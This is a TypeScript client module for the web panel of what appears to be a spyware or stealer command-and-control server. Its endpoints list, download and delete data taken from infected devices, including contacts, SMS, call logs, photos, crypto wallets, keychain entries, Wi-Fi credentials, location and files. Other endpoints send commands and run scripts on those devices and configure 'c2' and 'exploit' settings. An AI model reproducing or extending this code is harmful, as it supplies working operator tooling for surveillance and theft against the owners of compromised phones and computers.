import http, { buildParams, withOtp, request } from './index'
import { is2faError } from './index'

export { is2faError }

// ==================== Auth ====================
export const authApi = {
  login: (username: string, password: string) => {
    const formData = new URLSearchParams()
    formData.append('username', username)
    formData.append('password', password)
    return request({
      method: 'POST',
      url: '/api/auth/login',
      data: formData,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    })
  },
  logout: () => request({ method: 'POST', url: '/api/auth/logout' }),
  me: () => request({ method: 'GET', url: '/api/auth/me' }),
  init: () => request({ method: 'POST', url: '/api/auth/init' }),
  verify2fa: (tempToken: string, otpCode: string) =>
    request({
      method: 'POST',
      url: '/api/auth/verify-2fa',
      data: { temp_token: tempToken, otp_code: otpCode },
    }),
}

// ==================== 2FA ====================
export const twoFaApi = {
  setup: () => request({ method: 'GET', url: '/api/auth/2fa/setup' }),
  enable: (token: string) =>
    request({ method: 'POST', url: '/api/auth/2fa/enable', data: { token } }),
  disable: (token: string) =>
    request({ method: 'POST', url: '/api/auth/2fa/disable', data: { token } }),
  status: () => request({ method: 'GET', url: '/api/auth/2fa/status' }),
  verify: (token: string) =>
    request({ method: 'POST', url: '/api/auth/2fa/verify', data: { token } }),
}

// ==================== Dashboard ====================
export const dashboardApi = {
  stats: (days?: number) =>
    request({ method: 'GET', url: '/api/dashboard/stats', params: buildParams({ days }) }),
  summary: () => request({ method: 'GET', url: '/api/dashboard/summary' }),
}

// ==================== Devices ====================
export const devicesApi = {
  list: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/devices', params: buildParams(params) }),
  detail: (deviceUuid: string) =>
    request({ method: 'GET', url: `/api/devices/${deviceUuid}` }),
  delete: (deviceUuid: string, otpCode?: string) =>
    request({
      method: 'DELETE',
      url: `/api/devices/${deviceUuid}`,
      params: withOtp(otpCode),
    }),
  patch: (deviceUuid: string, data: Record<string, any>, otpCode?: string) =>
    request({
      method: 'PATCH',
      url: `/api/devices/${deviceUuid}`,
      data,
      params: withOtp(otpCode),
    }),
  batchDelete: (deviceUuids: string[], otpCode?: string) =>
    request({
      method: 'POST',
      url: '/api/devices/batch-delete',
      data: { device_uuids: deviceUuids },
      params: withOtp(otpCode),
    }),
  batchSetChannel: (deviceUuids: string[], channelId: number | undefined, otpCode?: string) =>
    request({
      method: 'POST',
      url: '/api/devices/batch-set-channel',
      data: { device_uuids: deviceUuids, channel_id: channelId },
      params: withOtp(otpCode),
    }),
  batchSetGroup: (deviceUuids: string[], groupId: number | undefined, otpCode?: string) =>
    request({
      method: 'POST',
      url: '/api/devices/batch-set-group',
      data: { device_uuids: deviceUuids, group_id: groupId },
      params: withOtp(otpCode),
    }),
  batchSetTemplate: (deviceUuids: string[], templateId: number | undefined, otpCode?: string) =>
    request({
      method: 'POST',
      url: '/api/devices/batch-set-template',
      data: { device_uuids: deviceUuids, template_id: templateId },
      params: withOtp(otpCode),
    }),
  batchSetEnabled: (deviceUuids: string[], enabled: boolean, otpCode?: string) =>
    request({
      method: 'POST',
      url: '/api/devices/batch-set-enabled',
      data: { device_uuids: deviceUuids, enabled },
      params: withOtp(otpCode),
    }),
  groups: () => request({ method: 'GET', url: '/api/devices/groups' }),
  createGroup: (data: { name: string; color?: string; description?: string }, otpCode?: string) =>
    request({
      method: 'POST',
      url: '/api/devices/groups',
      data,
      params: withOtp(otpCode),
    }),
  deleteGroup: (groupId: number, moveDevicesToGroupId?: number, otpCode?: string) =>
    request({
      method: 'DELETE',
      url: `/api/devices/groups/${groupId}`,
      params: buildParams({ move_devices_to_group_id: moveDevicesToGroupId, ...withOtp(otpCode) }),
    }),
  updateGroup: (groupId: number, data: Record<string, any>, otpCode?: string) =>
    request({
      method: 'PATCH',
      url: `/api/devices/groups/${groupId}`,
      data,
      params: withOtp(otpCode),
    }),
  stats: () => request({ method: 'GET', url: '/api/devices/stats' }),
  heartbeats: (deviceUuid: string, limit?: number, skip?: number) =>
    request({
      method: 'GET',
      url: `/api/devices/${deviceUuid}/heartbeats`,
      params: buildParams({ limit, skip }),
    }),
  logs: (deviceUuid: string, limit?: number, skip?: number, tailLog?: number) =>
    request({
      method: 'GET',
      url: `/api/devices/${deviceUuid}/logs`,
      params: buildParams({ limit, skip, tail_log: tailLog }),
    }),
  clearLogs: (deviceUuid: string, otpCode?: string) =>
    request({
      method: 'DELETE',
      url: `/api/devices/${deviceUuid}/logs`,
      params: withOtp(otpCode),
    }),
}

// ==================== Exfil ====================
export const exfilApi = {
  list: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/exfil', params: buildParams(params) }),
  get: (exfilId: number) => request({ method: 'GET', url: `/api/exfil/${exfilId}` }),
  delete: (exfilId: number, otpCode?: string) =>
    request({ method: 'DELETE', url: `/api/exfil/${exfilId}`, params: withOtp(otpCode) }),
  batchDelete: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'POST', url: '/api/exfil/batch_delete', data, params: withOtp(otpCode) }),
  download: (exfilId: number) =>
    request({ method: 'GET', url: `/api/exfil/${exfilId}/download`, responseType: 'blob' }),
  stats: () => request({ method: 'GET', url: '/api/exfil/stats' }),
  contacts: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/exfil/contacts', params: buildParams(params) }),
  sms: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/exfil/sms', params: buildParams(params) }),
  calls: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/exfil/calls', params: buildParams(params) }),
  photos: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/exfil/photos', params: buildParams(params) }),
  wallets: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/exfil/wallets', params: buildParams(params) }),
  keychain: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/exfil/keychain', params: buildParams(params) }),
  wifi: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/exfil/wifi', params: buildParams(params) }),
  location: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/exfil/location', params: buildParams(params) }),
  systemInfo: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/exfil/system_info', params: buildParams(params) }),
  files: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/exfil/files', params: buildParams(params) }),
}

// ==================== Commands ====================
export const commandsApi = {
  list: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/commands', params: buildParams(params) }),
  get: (commandId: number) => request({ method: 'GET', url: `/api/commands/${commandId}` }),
  create: (data: { command: string; device_uuid?: string }, otpCode?: string) =>
    request({ method: 'POST', url: '/api/commands', data, params: withOtp(otpCode) }),
  delete: (commandId: number, otpCode?: string) =>
    request({ method: 'DELETE', url: `/api/commands/${commandId}`, params: withOtp(otpCode) }),
  cancel: (commandId: number, otpCode?: string) =>
    request({ method: 'POST', url: `/api/commands/${commandId}/cancel`, params: withOtp(otpCode) }),
  retry: (commandId: number, otpCode?: string) =>
    request({ method: 'POST', url: `/api/commands/${commandId}/retry`, params: withOtp(otpCode) }),
  batchDelete: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'POST', url: '/api/commands/batch_delete', data, params: withOtp(otpCode) }),
  // Scripts
  listScripts: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/commands/scripts', params: buildParams(params) }),
  createScript: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'POST', url: '/api/commands/scripts', data, params: withOtp(otpCode) }),
  updateScript: (scriptId: number, data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: `/api/commands/scripts/${scriptId}`, data, params: withOtp(otpCode) }),
  deleteScript: (scriptId: number, otpCode?: string) =>
    request({ method: 'DELETE', url: `/api/commands/scripts/${scriptId}`, params: withOtp(otpCode) }),
  patchScript: (scriptId: number, data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PATCH', url: `/api/commands/scripts/${scriptId}`, data, params: withOtp(otpCode) }),
  runScript: (scriptId: number, data?: any, otpCode?: string) =>
    request({
      method: 'POST',
      url: `/api/commands/scripts/${scriptId}/run`,
      data,
      params: withOtp(otpCode),
    }),
}

// ==================== Channels ====================
export const channelsApi = {
  list: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/channels', params: buildParams(params) }),
  create: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'POST', url: '/api/channels', data, params: withOtp(otpCode) }),
  get: (channelId: number) => request({ method: 'GET', url: `/api/channels/${channelId}` }),
  getBySlug: (slug: string) => request({ method: 'GET', url: `/api/channels/slug/${slug}` }),
  delete: (channelId: number, otpCode?: string) =>
    request({ method: 'DELETE', url: `/api/channels/${channelId}`, params: withOtp(otpCode) }),
  update: (channelId: number, data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PATCH', url: `/api/channels/${channelId}`, data, params: withOtp(otpCode) }),
  embed: (channelId: number, params: Record<string, any> = {}) =>
    request({ method: 'GET', url: `/api/channels/${channelId}/embed`, params: buildParams(params) }),
  rotateKey: (channelId: number, otpCode?: string) =>
    request({ method: 'POST', url: `/api/channels/${channelId}/rotate-key`, params: withOtp(otpCode) }),
  s2sRegister: (channelId: number, data: Record<string, any>) =>
    request({ method: 'POST', url: `/api/channels/${channelId}/s2s-register`, data }),
}

// ==================== Templates ====================
export const templatesApi = {
  list: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/templates', params: buildParams(params) }),
  create: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'POST', url: '/api/templates', data, params: withOtp(otpCode) }),
  get: (templateId: number) => request({ method: 'GET', url: `/api/templates/${templateId}` }),
  getBySlug: (slug: string) => request({ method: 'GET', url: `/api/templates/slug/${slug}` }),
  delete: (templateId: number, otpCode?: string) =>
    request({ method: 'DELETE', url: `/api/templates/${templateId}`, params: withOtp(otpCode) }),
  update: (templateId: number, data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PATCH', url: `/api/templates/${templateId}`, data, params: withOtp(otpCode) }),
  preview: (templateId: number) =>
    request({ method: 'GET', url: `/api/templates/${templateId}/preview` }),
  seed: (force?: boolean, otpCode?: string) =>
    request({
      method: 'POST',
      url: '/api/templates/seed',
      params: buildParams({ force, ...withOtp(otpCode) }),
    }),
}

// ==================== Wallets ====================
export const walletsApi = {
  list: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/wallets', params: buildParams(params) }),
  parsed: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/wallets/parsed', params: buildParams(params) }),
  stats: () => request({ method: 'GET', url: '/api/wallets/stats' }),
  types: () => request({ method: 'GET', url: '/api/wallets/types' }),
}

// ==================== Logs ====================
export const logsApi = {
  list: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/logs', params: buildParams(params) }),
  types: () => request({ method: 'GET', url: '/api/logs/types' }),
}

// ==================== Audit ====================
export const auditApi = {
  list: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/audit', params: buildParams(params) }),
  actions: () => request({ method: 'GET', url: '/api/audit/actions' }),
}

// ==================== Notifications ====================
export const notificationsApi = {
  list: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/notifications', params: buildParams(params) }),
  unreadCount: () => request({ method: 'GET', url: '/api/notifications/unread-count' }),
  markAllRead: () => request({ method: 'PUT', url: '/api/notifications/read' }),
  markRead: (notificationId: number) =>
    request({ method: 'PUT', url: `/api/notifications/${notificationId}/read` }),
  delete: (notificationId: number) =>
    request({ method: 'DELETE', url: `/api/notifications/${notificationId}` }),
  clear: (category?: string) =>
    request({ method: 'DELETE', url: '/api/notifications', params: buildParams({ category }) }),
  // SSE stream - returns EventSource URL
  streamUrl: () => {
    const proto = window.location.protocol === 'https:' ? 'https:' : 'http:'
    return `${proto}//${window.location.host}/api/notifications/stream`
  },
}

// ==================== Settings ====================
export const settingsApi = {
  get: () => request({ method: 'GET', url: '/api/settings' }),
  update: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings', data, params: withOtp(otpCode) }),
  all: () => request({ method: 'GET', url: '/api/settings/all' }),
  updateBasic: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/basic', data, params: withOtp(otpCode) }),
  updateC2: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/c2', data, params: withOtp(otpCode) }),
  updateExploit: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/exploit', data, params: withOtp(otpCode) }),
  updateRetention: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/retention', data, params: withOtp(otpCode) }),
  updateCron: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/cron', data, params: withOtp(otpCode) }),
  updateAuth: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/auth-tune', data, params: withOtp(otpCode) }),
  updateLimits: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/limits', data, params: withOtp(otpCode) }),
  updateFrontend: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/frontend', data, params: withOtp(otpCode) }),
  updateDevice: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/device', data, params: withOtp(otpCode) }),
  updateSecurity: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/security', data, params: withOtp(otpCode) }),
  updateWatermark: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/watermark', data, params: withOtp(otpCode) }),
  bulk: (data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PUT', url: '/api/settings/bulk', data, params: withOtp(otpCode) }),
}

// ==================== Users ====================
export const usersApi = {
  list: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/users', params: buildParams(params) }),
  create: (data: { username: string; password: string; role?: string }, otpCode?: string) =>
    request({ method: 'POST', url: '/api/users', data, params: withOtp(otpCode) }),
  get: (userId: number) => request({ method: 'GET', url: `/api/users/${userId}` }),
  delete: (userId: number, otpCode?: string) =>
    request({ method: 'DELETE', url: `/api/users/${userId}`, params: withOtp(otpCode) }),
  update: (userId: number, data: Record<string, any>, otpCode?: string) =>
    request({ method: 'PATCH', url: `/api/users/${userId}`, data, params: withOtp(otpCode) }),
  changePassword: (userId: number, data: Record<string, any>, otpCode?: string) =>
    request({
      method: 'POST',
      url: `/api/users/${userId}/change-password`,
      data,
      params: withOtp(otpCode),
    }),
  forceLogout: (userId: number, otpCode?: string) =>
    request({ method: 'POST', url: `/api/users/${userId}/force-logout`, params: withOtp(otpCode) }),
  reset2fa: (userId: number, otpCode?: string) =>
    request({ method: 'POST', url: `/api/users/${userId}/reset-2fa`, params: withOtp(otpCode) }),
}

// ==================== Reporting ====================
export const reportingApi = {
  deviceData: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/device-data', params: buildParams(params) }),
  uploadDeviceData: (data: Record<string, any>) =>
    request({ method: 'POST', url: '/api/device-data', data }),
  reports: (params: Record<string, any> = {}) =>
    request({ method: 'GET', url: '/api/report', params: buildParams(params) }),
  uploadReport: (data: Record<string, any>) =>
    request({ method: 'POST', url: '/api/report', data }),
}

// ==================== System ====================
export const systemApi = {
  health: () => request({ method: 'GET', url: '/api/health' }),
}
